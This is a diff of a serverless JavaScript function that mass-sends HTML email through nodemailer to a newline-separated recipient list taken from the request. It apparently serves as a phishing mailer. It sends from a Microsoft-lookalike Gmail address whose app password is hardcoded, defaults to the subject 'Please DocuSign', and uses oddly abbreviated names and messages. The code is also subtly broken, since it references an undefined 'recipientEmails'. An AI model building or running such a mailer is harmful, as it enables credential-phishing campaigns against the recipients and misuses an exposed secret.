@@ -1,33 +1,36 @@
 const nodemailer = require('nodemailer');
 
-exports.handler = async (event, context) => {
-  if (event.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 200,
-      headers: {
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'POST, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type'
-      },
-      body: ''
-    };
-  }
-
-  if (event.httpMethod !== 'POST') {
-    return {
-      statusCode: 405,
-      body: JSON.stringify({ error: 'Method not allowed' })
-    };
-  }
-
+exports.handler = async (event) => {
   try {
-    const formData = JSON.parse(event.body);
-    const { recsx } = formData;
+    const data = JSON.parse(event.body);
+    const recsx = data.recipients;
 
-    const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 465,
-      secure: true,
+    if (typeof recsx !== 'string' || !recsx) {
+      console.error("recsx is invalid:", recsx);
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ error: 'Invalid recipient emails' })
+      };
+    }
+
+    const emlStrng = recsx.trim();
+    console.log("emlStrng:", emlStrng);
+
+    const rcpntEmls = emlStrng.split('\n').map(email => email.trim()).filter(email => email !== "");
+    console.log("rcpntEmls:", rcpntEmls);
+
+    if (recipientEmails.length === 0) {
+      console.error("No valid recipient emails provided.");
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ error: 'No valid recipient emails provided' })
+      };
+    }
+
+      const transporter = nodemailer.createTransport({
+        host: 'smtp.gmail.com',
+        port: 465,
+        secure: true,
       auth: {
         user: 'mircosoftii@gmail.com',
         pass: 'lztqyrqznnqaieth'
@@ -35,9 +38,9 @@ exports.handler = async (event, context) => {
     });
 
     const mailOptions = {
-      from: '"Deets" <willyscotmegan@gmail.com>',
-      to: [],
-      subject: '',
+      from: '"Deets" <mircosoftii@gmail.com>',
+      to: rcpntEmls,
+      subject: data.subject || 'Please DocuSign',
       html: `
       <!DOCTYPE html>
       <html>
@@ -157,28 +160,27 @@ exports.handler = async (event, context) => {
       `
     };
 
-  const emList = `${wName}`;
-  const emlArray = emList.trim().split('\n');
-  mailOptions.to = emlArray;
+    console.log("mailOptions before sending:", mailOptions);
 
-    await transporter.sendMail(mailOptions);
+    const info = await transporter.sendMail(mailOptions);
+    console.log('Emlsnt:', info.response);
 
     return {
       statusCode: 200,
       headers: {
         'Access-Control-Allow-Origin': '*'
       },
-      body: JSON.stringify({ success: true })
+      body: JSON.stringify({ success: true, message: 'Emlsntscsfly' })
     };
 
   } catch (error) {
-    console.error('Error:', error);
+    console.error('Errsbmtfnctn:', error);
     return {
       statusCode: 500,
       headers: {
         'Access-Control-Allow-Origin': '*'
       },
-      body: JSON.stringify({ error: 'Fail2prcsrqst' })
+      body: JSON.stringify({ error: 'Fldtprcsrqst' })
     };
   }
 };
